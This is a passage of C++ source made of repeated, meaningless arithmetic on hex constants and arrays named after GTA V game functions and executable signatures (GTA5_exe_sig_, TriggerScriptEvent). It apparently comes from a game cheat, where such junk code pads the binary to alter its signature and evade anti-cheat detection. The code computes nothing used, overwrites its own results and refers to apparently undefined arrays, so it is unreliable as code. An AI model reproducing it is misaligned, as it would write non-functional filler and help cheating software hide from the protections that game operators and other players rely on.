				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<Type>2</Type>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
